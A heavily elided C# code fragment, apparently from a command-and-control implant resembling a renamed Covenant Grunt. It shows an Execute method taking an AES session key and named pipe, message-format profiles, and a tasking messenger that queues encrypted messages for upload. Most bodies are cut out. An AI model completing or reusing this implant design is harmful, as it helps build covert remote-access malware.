...
namespace MofoExecutor
{
    class Mofo
    {
        public static void Execute(string SOMEID, Aes SessKEy, NamedPipeServerStream ServerPipe = null, string PipeName = null)
        {
            try
            {
                ...
                (
                    ...
                    bAsemEsSenger,
                    new Profile(ProfileReadFormat, ProfileWriteFormat, SOMEID)
                );
    ...
    public class Profile
    {
        ...
        public string FormatReadFormat(MofoEncMsg Message) { return Format(this.ReadFormat, this.Guid, Message); }
        public string FormatWriteFormat(MofoEncMsg Message) { return Format(this.WriteFormat, this.Guid, Message); }
    ...
    public class TaskingMessenger
    {
        ...
        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            ...
            string uploaded = this.Profile.FormatWriteFormat(mofoMessage);
